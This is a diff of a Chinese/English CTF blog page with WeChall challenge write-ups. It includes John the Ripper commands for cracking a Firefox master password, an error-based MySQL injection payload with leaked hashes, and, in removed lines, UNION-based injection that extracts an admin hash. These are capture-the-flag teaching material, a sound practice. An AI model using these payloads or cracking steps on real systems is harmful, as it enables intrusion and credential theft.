+      <time title="Created: 2026-07-14 10:20:24" itemprop="dateCreated datePublished" datetime="2026-07-14T10:20:24+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-burning-fox/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-burning-fox/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Burning Fox (Cracking) — score 4.</p>
+<p>Our security agency got delivered a copy of a portable firefox
+installation. Your job is to crack the master password so the
+authorities can investigate more websites and private content generated
+by this person.</p>
+<p>You can download the portable version from this folder, filename
+"burningfox.zip".</p>
+</blockquote>
+<p>提供一个 Firefox Portable 打包文件，需要破解其 Master Password
+以获取浏览器中保存的敏感信息。</p>
+<h3 id="solution">solution</h3>
+<p>这是一个 Firefox 密码破解 + 浏览器数据分析的两阶段挑战：</p>
+<ol type="1">
+<li><strong>破解 Master Password</strong>：从 <code>key3.db</code> 提取
+hash，用 John the Ripper 或 FireMaster 破解</li>
+<li><strong>分析浏览器数据</strong>：用破解的密码解锁
+Firefox，在保存的密码/历史/书签中找到挑战答案</li>
+</ol>
+<h3 id="步骤一破解-master-password">步骤一：破解 Master Password</h3>
+<p>下载 <code>burningfox.zip</code>，解压后定位到 Firefox 配置文件目录
+<code>FirefoxPortable/Data/profile/</code>。</p>
+<p>使用 John the Ripper 的 <code>mozilla2john</code> 工具从
+<code>key3.db</code> 提取 hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mozilla2john FirefoxPortable/Data/profile/key3.db &gt; mozhash.txt</span><br><span class="line">john --format=mozilla --wordlist=rockyou.txt mozhash.txt</span><br></pre></td></tr></table></figure>
+<p>Master Password 很快就能被 rockyou
+字典破解出来：<strong><code>wonderful</code></strong></p>
+<p>验证方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=mozilla --show mozhash.txt</span><br></pre></td></tr></table></figure>
+<p>拿到 Master Password 后，有两种路径找到答案：</p>
+<p><strong>方案 A</strong>：启动 Firefox Portable（需要 X11/Wine
+环境），用 Master Password 解锁，浏览浏览器中保存的密码和历史记录。</p>
+<p><strong>方案 B</strong>：直接用 SQLite 查看
+<code>signons.sqlite</code>（密码数据库），配合 Mozilla
+密码转储工具解密保存的凭据。</p>
+<p>答案不是 Master Password
+本身，而是浏览器中保存的一条特殊密码/书签。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ThinKingOutSideTheBox</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-light-in-the-darkness/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-light-in-the-darkness/" class="post-title-link" itemprop="url">WeChall - Light in the Darkness</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-14 10:13:27" itemprop="dateCreated datePublished" datetime="2026-07-14T10:13:27+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:13:03" itemprop="dateModified" datetime="2026-09-15T10:13:03+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-light-in-the-darkness/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-light-in-the-darkness/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Light in the Darkness (MySQL, Exploit) — score 6, by Mawekl.</p>
+<p>This challenge is the sequel to the "Blinded by the lighter"
+challenge. Again your mission is to extract an md5 password hash out of
+the database. This time your limit for this sql injection are 2 queries.
+Also you have to accomplish this task 3 times consecutively, to prove
+you have solved the challenge. Again you are given the sourcecode of the
+vulnerable script, also as highlighted version. To restart the
+challenge, you can execute a reset. Thanks to Mawekl for his motivation!
+Good luck!</p>
+</blockquote>
+<p>前作 "Blinded by the lighter" 的升级版。同样是 SQL 注入提取 MD5
+password hash，但限制更严：<strong>最多 2
+次查询</strong>（整个挑战生命周期），且需要 <strong>连续 3
+轮成功</strong> 才算通关。</p>
+<h3 id="源码分析">源码分析</h3>
+<p>完整源码在 <code>gizmore/gwf3</code> GitHub 仓库：</p>
+<ul>
+<li><code>www/challenge/Mawekl/light_in_the_darkness/vuln.php</code>：注入点</li>
+<li><code>www/challenge/Mawekl/light_in_the_darkness/index.php</code>：表单逻辑</li>
+<li><code>www/challenge/Mawekl/light_in_the_darkness/install.php</code>：挑战初始化</li>
+</ul>
+<p><strong>vuln.php：注入点</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blightVuln</span>(<span class="params"><span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># Filter: blocks /* and &quot;blight&quot; in the injection string</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="title function_ invoke__">strpos</span>(<span class="variable">$password</span>, <span class="string">&#x27;/*&#x27;</span>) !== <span class="literal">false</span>) || (<span class="title function_ invoke__">stripos</span>(<span class="variable">$password</span>, <span class="string">&#x27;blight&#x27;</span>) !== <span class="literal">false</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">blightDB</span>();</span><br><span class="line">    <span class="variable">$sessid</span> = <span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getSessSID</span>();</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT 1 FROM (SELECT password FROM blight WHERE sessid=<span class="subst">$sessid</span>) b WHERE password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">queryFirst</span>(<span class="variable">$query</span>) !== <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键点：</strong></p>
+<ul>
+<li>注入点在 WHERE 子句，<code>password</code> 列来自子查询别名
+<code>b</code></li>
+<li>过滤器：禁止 <code>/*</code>（堵多行注释截断）和
+<code>blight</code>（堵直接引用表名）</li>
+<li><code>setVerbose(true)</code>：SQL
+错误会完整回显到页面。<strong>这是报错注入的前提条件</strong></li>
+<li><code>queryFirst()</code> 使用
+<code>mysqli_query()</code>（不支持堆叠查询）</li>
+<li>SLEEP/BENCHMARK 未被过滤，但 2
+次查询限制让时间/布尔盲注都不可行</li>
+</ul>
+<p><strong>index.php：表单逻辑</strong>：</p>
+<ul>
+<li><code>injection</code> + <code>inject</code> →
+<code>blightVuln($password)</code></li>
+<li><code>thehash</code> + <code>mybutton</code> →
+<code>blightGetHash()</code> 从 DB 读 hash 并比对</li>
+<li><code>reset=me</code> → 显示旧 hash（如果有），然后生成新 hash</li>
+</ul>
+<p><strong>限制：</strong> 常数 <code>BLIGHT3_ATTEMPS</code> =
+2（源码中的拼写，非笔误），最大允许 attempt = 3。每次 inject 或 hash
+提交消耗 1 次 attempt。每次成功提交 hash 后 attempt 重置为 0，同时
+consecutive 计数器 +1。连续 3 轮成功后 challenge solved。</p>
+<h3 id="solution">solution</h3>
+<p>核心思路：利用 MySQL <code>GROUP BY</code> 对非确定性表达式
+<code>FLOOR(RAND(0)*2)</code> 的求值 bug，触发
+<code>Duplicate entry</code> 错误，在错误信息中泄露
+<code>CONCAT(password, FLOOR(RAND(0)*2))</code> 的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or (select count(*) from information_schema.COLLATIONS group by concat(password,floor(rand(0)*2))) --</span><br></pre></td></tr></table></figure>
+<p><strong>为什么用 <code>RAND(0)</code>（有种子）而不是
+<code>RAND()</code>：</strong></p>
+<ul>
+<li><code>RAND(0)</code> 产生确定序列：0, 1, 1, 0, 1, 0, 0, 1, ...</li>
+<li>第 2 行和第 3 行都得到值 1，导致 GROUP BY
+临时表唯一键冲突，触发报错</li>
+<li><code>RAND()</code>（无种子）每次序列随机，不可靠</li>
+<li>注意：序列依赖 MySQL 版本（5.x vs 8.x 可能不同）</li>
+</ul>
+<p><strong>为什么用
+<code>information_schema.COLLATIONS</code>：</strong></p>
+<ul>
+<li>比 <code>information_schema.TABLES</code> 更轻量，不会锁 MyISAM
+表</li>
+<li>需要至少 3 行的表（RAND(0) 的重复在行 2-3 出现，所以要求表 &gt;= 3
+行）</li>
+</ul>
+<p><strong>密码提取：</strong> Duplicate entry 显示的是
+<code>CONCAT(password, FLOOR(RAND(0)*2))</code>，即
+<code>password0</code> 或 <code>password1</code>（尾部数字是 RAND
+输出）。 密码 = Duplicate entry 值的前 32 字符（MD5 hex 正好 32
+位）。</p>
+<h3 id="攻击流程"><strong>攻击流程</strong></h3>
+<p>每轮 2 次操作：1 次注入提取（消耗 1 attempt）+ 1 次 hash 提交（消耗 1
+attempt），共 3 轮。</p>
+<ol type="1">
+<li><code>reset=me</code> → 重置挑战，attempt=0，生成新 hash</li>
+<li>注入提取 → attempt=1，错误信息中拿到 password</li>
+<li>提交 hash → attempt=2，成功 → attempt 归零，新 hash 生成</li>
+<li>重复步骤 2-3 两次</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Round 1</span><br><span class="line">injection=&#x27; or (select count(*) from information_schema.COLLATIONS group by concat(password,floor(rand(0)*2))) --</span><br><span class="line">→ Duplicate entry &#x27;A43B4E914FD58059B5526D2B46854F411&#x27;</span><br><span class="line">→ password = A43B4E914FD58059B5526D2B46854F41</span><br><span class="line">→ submit hash → OK, need 2 more</span><br><span class="line"></span><br><span class="line"># Round 2</span><br><span class="line">→ Duplicate entry &#x27;217CD978A6269E1C6E6116FB3E6591CF1&#x27;</span><br><span class="line">→ password = 217CD978A6269E1C6E6116FB3E6591CF</span><br><span class="line">→ submit hash → OK, need 1 more</span><br><span class="line"></span><br><span class="line"># Round 3</span><br><span class="line">→ Duplicate entry &#x27;0B0A3307D46435DA0EDDC93E37A2D7B11&#x27;</span><br><span class="line">→ password = 0B0A3307D46435DA0EDDC93E37A2D7B1</span><br><span class="line">→ submit hash → CHALLENGE SOLVED!</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-paranoid/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-paranoid/" class="post-title-link" itemprop="url">WeChall - Paranoid</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-13 20:19:15" itemprop="dateCreated datePublished" datetime="2026-07-13T20:19:15+08:00">2026-07-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -338,8 +1309,8 @@ p.spoiler {
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-md5-salt/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-md5-salt/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-paranoid/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-paranoid/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -353,71 +1324,44 @@ p.spoiler {
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Your mission is to login as Admin. The application is vulnerable to
-sql injection, but the signup process seems a bit "weird". 目标是以
-admin 身份登录。用户名字段存在 SQL 注入漏洞。</p>
-</blockquote>
-<p>题目给出了 users 表结构（<code>username</code>、<code>password</code>
-两列）。登录表单同时兼具注册功能：输入新用户名和密码即可注册。</p>
-<p>表单字段名为 <code>username</code> 和
-<code>credents</code>。密码的存储方式为
-<code>md5($password . 'salt21')</code>，即 MD5 后接固定盐值
-<code>salt21</code>。</p>
-<h3 id="solution">Solution</h3>
-<p><strong>Step 1: 提取 admin 的密码 hash</strong></p>
-<p>通过 UNION 注入读取 admin 的 password 字段：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27; UNION SELECT CONCAT(username,0x3a,password),1 FROM users WHERE username=&#x27;</span>admin<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
-<p>返回结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello Admin:215c61d0104f8925b5f7e4e87a7cbdfa... checking your credentials...</span><br></pre></td></tr></table></figure>
-<p>admin 的密码 hash 为
-<code>215c61d0104f8925b5f7e4e87a7cbdfa</code>。</p>
-<p><strong>Step 2: 确定 hash 算法</strong></p>
-<p>注册一个新用户，用 UNION 提取其 hash，与各种算法比对：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册新用户 extractnqwozrfv 密码 password1</span></span><br><span class="line"><span class="comment"># 提取其 hash</span></span><br><span class="line">$ username=<span class="string">&#x27; UNION SELECT CONCAT(username,0x3a,password),1 FROM users WHERE username=&#x27;</span>extractnqwozrfv<span class="string">&#x27; -- &#x27;</span></span><br><span class="line">Hello extractnqwozrfv:bd4db6aa036b085e72f546130e5007b7</span><br></pre></td></tr></table></figure>
-<p>比对算法后发现：<code>md5('password1' . 'salt21')</code> =
-<code>bd4db6aa036b085e72f546130e5007b7</code></p>
-<p><strong>Step 3: 破解 admin 的 hash</strong></p>
-<p>拿到 <code>215c61d0104f8925b5f7e4e87a7cbdfa</code> 后，需要用 MD5
-反查得到明文。这里是本题最核心的一步：<strong>在线 MD5
-反查服务</strong>。</p>
-<p>尝试了多个在线 hash 反查网站：</p>
+          <p>very simple and interesting stegano, but need to be careful and be
+patient</p>
+<h3 id="challenge">Challenge</h3>
+<p>Gizmore 的第二个 stegano 题。页面有 answer box + captcha
+验证，captcha 点击后刷新（timestamp jpg）。</p>
+<h3 id="url">URL</h3>
 <ul>
-<li>cmd5.com / xmd5.com：需要付费</li>
-<li>pmd5.com：解不出</li>
-<li><strong>somd5.com</strong>：成功解出，返回明文
-<code>academicsalt21</code></li>
+<li>挑战页:
+<code>https://www.wechall.net/en/challenge/paranoid/index.php</code></li>
+<li>Captcha 生成:
+<code>https://www.wechall.net/en/Captcha/&lt;text&gt;</code>，URL path
+直接决定 captcha 图片文字</li>
 </ul>
+<h3 id="挑战描述">挑战描述</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;W&lt;/b&gt;ith pleasure I present you my second ste&lt;i&gt;g&lt;/i&gt;ano.</span><br><span class="line">&lt;b&gt;R&lt;/b&gt;ight w&lt;i&gt;r&lt;/i&gt;itten from scratch in a paranoid mind.</span><br><span class="line">&lt;b&gt;O&lt;/b&gt;r may&lt;i&gt;b&lt;/i&gt;e I am just testing my website framework.</span><br><span class="line">&lt;b&gt;N&lt;/b&gt;evermind, I hope you enjoy this challen&lt;i&gt;ge&lt;/i&gt;.</span><br><span class="line">&lt;b&gt;G&lt;/b&gt;ood Luck</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Bold 首字母</strong>: W, R, O, N, G →
+<strong>WRONG</strong>（故意误导）</li>
+<li><strong>Italic 字母</strong>: g, r, b, ge →
+<strong>GRBGE</strong>（关键线索，源码注释确认重要）</li>
+</ul>
+<h3 id="关键线索-1-grbge">关键线索 1: GRBGE</h3>
+<p>源码注释（<code>www/challenge/paranoid/lang/chall_en.php</code>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># It is important the the letters GRBGE are in &lt;i&gt; italic.</span></span><br></pre></td></tr></table></figure>
+<p>GRBGE = "Garbage" 的元音省略拼法（G-R-B-G-E，去掉了 A）。但 "garbage"
+不是答案，GRBGE 指向的是 captcha 机制本身。</p>
+<h3 id="关键线索-2-captcha-序列轮换">关键线索 2: Captcha 序列轮换</h3>
+<p>每次提交 wrong 答案后，页面上的 captcha
+图片路径会切换到下一个。通过连续提交 wrong 答案，得到 12
+个词的有序序列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YOURE → LOOKN → FORDA → PASWD → THECA → PTCHA →</span><br><span class="line">GRBGE → YADDA → HELLO → HACKR → HOWYA → DOING → (循环)</span><br></pre></td></tr></table></figure>
+<p>翻译成英文句子：</p>
 <blockquote>
-<p>注意：hashcat / john 等本地工具也可以做，但对于这种简单单词 +
-固定后缀的模式，用彩虹表/在线反查更快。关键在于 hash 的构造方式是
-<code>md5(明文密码 + 'salt21')</code>，所以反查工具返回的原始输入是
-<code>密码 + salt21</code> 整体。</p>
+<p><strong>"You're looking for the password the captcha garbage yadda
+hello hacker how ya doing?"</strong></p>
 </blockquote>
-<p><strong>Step 4: 去掉盐值得到真正密码</strong></p>
-<p>somd5 返回的明文是
-<code>academicsalt21</code>。这里存在一个易错点：直接使用该值登录会失败。</p>
-<p>题目的名字 <strong>MD5.SALT</strong> 是关键提示：salt 是拼接在 hash
-计算过程中的，不是密码的一部分。所以：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&#x27;academic&#x27;</span> + <span class="string">&#x27;salt21&#x27;</span>) = md5(<span class="string">&#x27;academicsalt21&#x27;</span>) = 215c61d0104f8925b5f7e4e87a7cbdfa</span><br></pre></td></tr></table></figure>
-<p>真正的密码是去掉末尾 <code>salt21</code> 之后的那一段。</p>
-<p><strong>Step 5: 登录</strong></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">credents: academic</span><br></pre></td></tr></table></figure>
-<p>登录成功，<code>/en/challs</code> 中该题显示为
-<code>wc_chall_solved_1</code>。</p>
-<p><strong>关键的 SQL 注入点</strong></p>
-<p>LOGIN 功能的 SQL 查询：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>该查询结果用于获取用户名和密码 hash，然后 PHP 做密码对比：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">queryFirst</span>(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="variable">$input_hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span> . <span class="string">&#x27;salt21&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$input_hash</span>) &#123;</span><br><span class="line">        <span class="comment">// login success</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>注册功能的 INSERT 也使用了相同的 hash 算法，所以注册和登录一致。</p>
-<p><strong>关于 "weird signup"</strong></p>
-<p>挑战描述提到注册过程 "a bit
-weird"。检查源码发现，在注册时会校验所输入的密码是否与真实的 WeChall
-账号密码一致，如果是，会拒绝注册（<code>err_fool</code>：不允许在这里使用你的真实
-WeChall 密码）。但这不影响解题。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">academic</span></span>
+<p>两段拼接后即题面要求的口令（读作 "The Captcha"）。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">THECAPTCHA</span></span>
 
       
     </div>
@@ -444,7 +1388,7 @@ WeChall 密码）。但这不影响解题。</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-11/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-extract-me/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -462,7 +1406,7 @@ WeChall 密码）。但这不影响解题。</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-11/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 11</a>
+          <a href="/wp/WeChall/wechall-extract-me/" class="post-title-link" itemprop="url">WeChall - eXtract Me</a>
         </h2>
 
         <div class="post-meta-container">
@@ -473,14 +1417,14 @@ WeChall 密码）。但这不影响解题。</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-09 20:55:39" itemprop="dateCreated datePublished" datetime="2026-06-09T20:55:39+08:00">2026-06-09</time>
+      <time title="Created: 2026-07-12 15:15:07" itemprop="dateCreated datePublished" datetime="2026-07-12T15:15:07+08:00">2026-07-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:12:11" itemprop="dateModified" datetime="2026-09-15T10:12:11+08:00">2026-09-15</time>
+      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -501,8 +1445,8 @@ WeChall 密码）。但这不影响解题。</p>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-11/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-11/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-extract-me/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-extract-me/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -517,58 +1461,120 @@ WeChall 密码）。但这不影响解题。</p>
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
+<p>eXtract Me (Encoding, Stegano) — score 3, by oleg.</p>
 <blockquote>
-<p>Sam decided to make a music site. Unfortunately he does not
-understand Apache.</p>
-<p>Sam 决定做一个音乐网站，可惜他不懂 Apache 配置。</p>
+<p>Yo dog, I heard you like zips so we put a zip in your zip so you can
+unzip unzipped zips. Enjoy!</p>
 </blockquote>
-<p>页面上随机显示一句歌词，如
-<code>"Ghetto Gospel" is the best!</code>，每次刷新会变。没有密码输入框，没有明显的交互元素。</p>
+<p>Download: <code>r.zip</code> (2698 bytes).</p>
 <h3 id="solution">Solution</h3>
-<p>这题考察的是 Apache 服务器配置知识，解题过程像一个探索任务。</p>
-<h4 id="step-1识别歌曲线索">Step 1：识别歌曲线索</h4>
-<p>多次刷新页面，歌曲会变化，包括：</p>
+<p>The challenge is an archive matryoshka: the <code>r.zip</code>
+contains an infinite recursive zip (<code>r/r.zip</code> → always the
+same inner zip), plus hidden data appended after the ZIP EOCD.</p>
+<p><strong>Step 1 — Cut out the second archive</strong></p>
+<p><code>r.zip</code> is actually two things stitched together:</p>
 <ul>
-<li>"Ghetto Gospel" (2Pac ft. Elton John)</li>
-<li>"Georgia" (Elton John)</li>
-<li>等等</li>
+<li>First 440 bytes: the recursive zip (r/r.zip, endless loop)</li>
+<li>Remaining 2258 bytes: LZW-compressed data (magic
+<code>\x1f\x9d</code>)</li>
 </ul>
-<p>搜索这些歌曲，全部是 <strong>Elton John</strong>
-的作品。这暗示了目录结构。</p>
-<h4 id="step-2目录遍历">Step 2：目录遍历</h4>
-<p>尝试拼出 Elton 的名字：访问
-<code>/missions/basic/11/e/</code>，返回目录列表。继续逐层访问：</p>
